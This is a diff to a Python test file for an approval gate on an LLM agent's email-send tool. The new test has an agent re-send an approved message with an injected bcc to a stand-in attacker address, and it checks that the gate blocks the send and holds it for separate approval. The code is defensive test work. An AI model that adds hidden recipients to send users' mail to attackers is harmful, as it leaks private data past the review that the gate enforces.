@@ -159,23 +159,54 @@ def test_approval_releases_stored_payload_over_drift(monkeypatch):
         approval.maybe_capture_approval("telegram", ALLOWED, "Yes, send it")
         == f"telegram:{ALLOWED}"
     )
-    # Turn 2: the LLM re-invokes with a DRIFTED body + an injected bcc.
+    # Turn 2: the LLM re-invokes with a DRIFTED body to the reviewed recipient.
     live_args = {
         "to": ["client@example.com"],
         "subject": "Report (reworded)",
         "text": "a DIFFERENT regenerated body",
-        "bcc": ["attacker@evil.com"],
     }
     result = enforce.evaluate_tool_call(
         "mcp_agentmail_send_message", live_args, "smd", session_id="s1"
     )
     assert result is None  # allowed — the send ships
-    # The STORED payload replaced the live args verbatim: reviewed body, no bcc.
+    # The STORED payload replaced the live args verbatim: the reviewed body.
     assert live_args["text"] == "the reviewed body"
     assert live_args["subject"] == "Report"
     assert "bcc" not in live_args
     # Single-use: the approval is consumed.
     assert PENDING_SEND.peek() is None
+
+
+def test_an_injected_bcc_is_a_different_send_and_is_withheld(monkeypatch):
+    """The gate classifies every address a message delivers to (ss-console
+    participant fence, 2026-10-07), bcc included. A re-invoke that adds a bcc is
+    a different recipient set: it does not ride the approval, nothing ships, and
+    it is held for its own approval.
+
+    FALSIFIER: classify ``to`` alone and this send ships under the approval."""
+    enforce = _load_enforce()
+    approval = _load_approval()
+    _setup_confirm(monkeypatch, enforce)
+    enforce.evaluate_tool_call(
+        "mcp_agentmail_send_message",
+        {"to": ["client@example.com"], "subject": "Report", "text": "the reviewed body"},
+        "smd",
+        session_id="s1",
+    )
+    assert approval.maybe_capture_approval("telegram", ALLOWED, "Yes, send it")
+    injected = {
+        "to": ["client@example.com"],
+        "subject": "Report",
+        "text": "the reviewed body",
+        "bcc": ["attacker@evil.com"],
+    }
+    blocked = enforce.evaluate_tool_call(
+        "mcp_agentmail_send_message", injected, "smd", session_id="s1"
+    )
+    assert blocked is not None and blocked["action"] == "block"
+    rec = PENDING_SEND.peek()
+    assert rec is not None and rec.approved is False
+    assert rec.recipients == frozenset({"client@example.com", "attacker@evil.com"})
 
 
 def test_no_approval_still_withholds(monkeypatch):
